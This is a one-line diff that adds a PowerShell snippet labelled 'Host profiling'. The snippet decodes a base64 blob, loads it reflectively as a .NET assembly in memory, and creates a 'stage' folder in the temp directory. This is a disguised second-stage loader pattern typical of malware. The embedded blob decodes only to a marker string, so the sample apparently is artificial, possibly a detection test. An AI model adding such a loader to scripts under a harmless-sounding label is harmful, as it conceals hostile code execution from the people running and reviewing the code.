@@ -1,0 +1,1 @@
+<# Host profiling #> $PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpqOXE4NHdudGNu"); $StageResult = [Reflection.Assembly]::Load($PayloadBytes); $StageResult.GetTypes().Count; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
